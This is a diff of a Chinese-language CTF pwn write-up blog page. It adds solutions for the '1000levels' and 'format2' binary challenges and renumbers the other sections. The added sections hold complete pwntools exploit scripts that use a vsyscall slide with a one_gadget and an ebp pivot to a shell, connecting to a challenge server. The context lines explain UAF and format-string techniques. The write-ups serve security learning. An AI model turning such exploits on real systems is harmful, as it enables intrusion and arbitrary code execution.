@@ -706,7 +706,7 @@
 
 <p>最终结果：</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091348996.png" alt="image-20201223091348996"></p>
-<h2 id="21-RCalc"><a href="#21-RCalc" class="headerlink" title="21. RCalc"></a>21. RCalc</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091552374.png" alt="image-20201223091552374"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091611277.png" alt="image-20201223091611277"></p>
+<h2 id="22-RCalc"><a href="#22-RCalc" class="headerlink" title="22. RCalc"></a>22. RCalc</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091552374.png" alt="image-20201223091552374"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091611277.png" alt="image-20201223091611277"></p>
 <h3 id="代码分析-16"><a href="#代码分析-16" class="headerlink" title="代码分析"></a>代码分析</h3><p>整个程序模拟了一个计算器。</p>
 <p>程序开始，申请了两个堆，且没有free，结合之后的代码可以知道，一个是0x100的存储数据的堆，一个是0x320的存储自定义的canary的堆。</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093330611.png" alt="image-20201223093330611"></p>
@@ -733,9 +733,48 @@
 
 <p>最终结果：</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223111914992.png" alt="image-20201223111914992"></p>
-<h2 id="22-Aul"><a href="#22-Aul" class="headerlink" title="22.Aul"></a>22.Aul</h2><h2 id="23"><a href="#23" class="headerlink" title="23."></a>23.</h2><h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211551807.png" alt="image-20201201211551807"></p>
+<h2 id="23-Aul"><a href="#23-Aul" class="headerlink" title="23.Aul"></a>23.Aul</h2><h2 id="24-1000levevls"><a href="#24-1000levevls" class="headerlink" title="24.1000levevls"></a>24.1000levevls</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212021372.png" alt="image-20201228212021372"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212100952.png" alt="image-20201228212100952"></p>
+<h3 id="代码分析-17"><a href="#代码分析-17" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212129503.png" alt="image-20201228212129503"></p>
+<p>找到一个栈溢出，但是因为开启了PIE，所以覆盖返回地址不可行，因为不能确定具体的地址，但是可以用vsyscall滑栈的方法。</p>
+<p>接下开就是思考如何调用system。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214540803.png" alt="image-20201228214540803"></p>
+<p>然后发现程序中有用到system，考虑是否可以利用。查看一下汇编，发现一个有趣的点，system地址入栈是在判断f之前的。</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214648552.png" alt="image-20201228214648552"></p>
+<p>同时查看主函数的调用关系，发现go函数和hint函数是公用一个栈的。</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214824523.png" alt="image-20201228214824523"></p>
+<p>同时还可以在go函数中看到，如果开始输入的是小于等于0的，那么v5不会初始化，也就是说如果先执行hint，然后输入v2小于等于0，那么v5就是system的地址，同时我们还有再一次输入的机会，并且这次输入将写入v6（v5+v3），也就是我们可以以system地址为基准，通过偏移得到任意的libc函数。</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228220305556.png" alt="image-20201228220305556"></p>
+<h3 id="思路及利用-15"><a href="#思路及利用-15" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>前面提到，控制程序执行只能通过滑栈的方式，也就是意味着很难有输入参数，因此自然想到将system地址改为onegadget地址，然后滑栈执行。</p>
+<p>接下来就是找到one_gadget与system的偏移和滑栈的偏移。而溢出函数ans如图所示，go的rsp就是ans的rbp。</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228221651239.png" alt="image-20201228221651239"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228222925316.png" alt="image-20201228222925316"></p>
+<p>因此进入ans后栈的情况为：</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228224934094.png" alt="image-20201228224934094">所以需要有3个vsyscall滑栈到go_rbp-0x110.</p>
+<p>最终exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./100levels&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">41349</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">vsyscall_addr = <span class="number">0xffffffffff600000</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;levels?&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(one_gadget-system_offset))</span><br><span class="line"><span class="comment">#需要先回答对99个问题，最后第100个进行溢出</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">    v9 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>)[:<span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">&quot;* &quot;</span>)</span><br><span class="line">    v10 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>)[:<span class="number">-1</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Answer:&quot;</span>, <span class="built_in">str</span>(v9 * v10))</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x30</span>+<span class="number">8</span>)+p64(vsyscall_addr) *<span class="number">3</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Answer:&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="25-format2"><a href="#25-format2" class="headerlink" title="25.format2"></a>25.format2</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230182624714.png" alt="image-20201230182624714"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230182747036.png" alt="image-20201230182747036"></p>
+<h3 id="代码分析-18"><a href="#代码分析-18" class="headerlink" title="代码分析"></a>代码分析</h3><p>存在后门函数：</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230183308602.png" alt="image-20201230183308602"></p>
+<p>而整个程序的流程是将我们输入的字符串进行BASE64解密后，再调用auth函数验证，成功就执行shell。</p>
+<p>auth存在一个栈溢出漏洞。v4是int类型有八个字节，而我们的输入最多到12个字节，也就是说我们可以覆盖到ebp。</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230183424923.png" alt="image-20201230183424923"></p>
+<h3 id="思路及利用-16"><a href="#思路及利用-16" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>上述分析可知，我们现在可以覆盖auth函数的ebp。</p>
+<p>假设我们修改了ebp的内容为xxxx，且这个xxxx能被正常访问，那么auth函数执行完成后，回到main函数的ebp就指向了xxxx。</p>
+<p>当main函数结束时，执行leave，retn指令。相当于：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov esp,ebp </span><br><span class="line">pop ebp <span class="comment">//ebp = &amp;xxxx</span></span><br><span class="line">pop rip <span class="comment">//rip = &amp;(xxxx)+4</span></span><br></pre></td></tr></table></figure>
+
+<p>也就是说，如果输入的input为aaaabbbbcccc，将cccc置为input的地址，那么就可以执行bbbb指向的内容。</p>
+<p>此，我们把bbbb改成我们的getshell的地址,把cccc改成input_addr，那么我们就能get shell。</p>
+<p>接下来就是确定getshell盒4和input的地址。</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185552349.png" alt="image-20201230185552349"></p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185625780.png" alt="image-20201230185625780"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">p = process(<span class="string">&#x27;./format2&#x27;</span>)  </span><br><span class="line"><span class="comment">#p = remote(&#x27;220.249.52.134&#x27;,31403)  </span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./format2&#x27;</span>)  </span><br><span class="line">input_addr = <span class="number">0x811eb40</span></span><br><span class="line">getshell_addr = <span class="number">0x8049284</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Authenticate :&#x27;</span>)  </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(getshell_addr) + p32(input_addr)  </span><br><span class="line">p.sendline(base64.b64encode(payload))  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>最终结果：</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185951134.png" alt="image-20201230185951134"></p>
+<h2 id="26-4-ReeHY-main-100"><a href="#26-4-ReeHY-main-100" class="headerlink" title="26.4-ReeHY-main-100"></a>26.4-ReeHY-main-100</h2><h2 id="27-echo-back"><a href="#27-echo-back" class="headerlink" title="27.echo_back"></a>27.echo_back</h2><h2 id="28"><a href="#28" class="headerlink" title="28."></a>28.</h2><h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211551807.png" alt="image-20201201211551807"></p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213201788.png" alt="image-20201201213201788"></p>
-<h3 id="代码分析-17"><a href="#代码分析-17" class="headerlink" title="代码分析"></a>代码分析</h3><p>主函数：</p>
+<h3 id="代码分析-19"><a href="#代码分析-19" class="headerlink" title="代码分析"></a>代码分析</h3><p>主函数：</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213310802.png" alt="image-20201201213310802"></p>
 <p>删除堆：</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213328651.png" alt="image-20201201213328651"></p>
@@ -749,7 +788,7 @@
 <p>而print函数中的<code>(*ptr[v1])(ptr[v1]);</code>实际上就是调用*ptr[v1]的函数（也就是自定义的put函数），ptr[v1]作为函数的参数。正常情况下，是输出ptr[v1+4]指向的内容，即输入的数据。</p>
 <p>用图来说明关系：</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214918029.png" alt="image-20201201214918029"></p>
-<h3 id="思路及利用-15"><a href="#思路及利用-15" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>根据上述的分析，显然这道题主要是利用UAF。control_chunk的大小是0x8，释放后会在fastbin中，利用fastbin的特性就可以再申请大小0x8的chunk，对释放的chunk进行写操作。</p>
+<h3 id="思路及利用-17"><a href="#思路及利用-17" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>根据上述的分析，显然这道题主要是利用UAF。control_chunk的大小是0x8，释放后会在fastbin中，利用fastbin的特性就可以再申请大小0x8的chunk，对释放的chunk进行写操作。</p>
 <p>也就是说，申请两个超过fastbin大小的chunk，然后释放。再申请0x8大小的chunk，这时候就可以向control_chunk进行写操作来执行需要的函数。（这里申请两个超过fastbin大小的chunk，是因为申请0x8的data_chunk还需要一个0x8的control_chunk，而且需要注意fastbin是采用单向链表维护，并且遵循<strong>后进先出</strong>的规则） </p>
 <p>首先，需要泄露libc的基地址，这里可以利用自定义的put函数，输出got表项。这里选择free函数。</p>
 <p>得到基地址后，只需要将control_chunk的fd改为system的地址，然后再写入参数‘sh’即可。这里就需要先将chunk2释放。但是进入fastbin的chunk仍是之前的两个，所以和之前一样，再次申请的chunk仍可以修改control_chunk1。</p>
@@ -772,14 +811,14 @@
 <h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201225035214.png" alt="image-20201201225035214"></p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209094754572.png" alt="image-20201209094754572"></p>
 <p>RELRO部分开启，可以改写GOT表。</p>
-<h3 id="代码分析-18"><a href="#代码分析-18" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209095207906.png" alt="image-20201209095207906"></p>
+<h3 id="代码分析-20"><a href="#代码分析-20" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209095207906.png" alt="image-20201209095207906"></p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209095323845.png" alt="image-20201209095323845"></p>
 <p>可以看到，read的范围很大，但是没法溢出栈底。</p>
 <blockquote>
 <p><strong>int snprintf(char *str, size_t size, const char *format, …)</strong> 设将可变参数(…)按照 format 格式化成字符串，并将字符串复制到 str 中，size 为要写入的字符的最大数目，超过 size 会被截断。</p>
 </blockquote>
 <p>因此，通过snprintf可以将v2溢出覆盖v3。</p>
-<h3 id="思路及利用-16"><a href="#思路及利用-16" class="headerlink" title="思路及利用"></a>思路及利用</h3><blockquote>
+<h3 id="思路及利用-18"><a href="#思路及利用-18" class="headerlink" title="思路及利用"></a>思路及利用</h3><blockquote>
 <p>通过实验发现，程序应该是使用的libc-2.23，需在相应环境下进行调试。</p>
 </blockquote>
 <p>v3是格式化字符串，上述分析知道可以将v3改写。利用格式化字符串做到任意地址读写。</p>
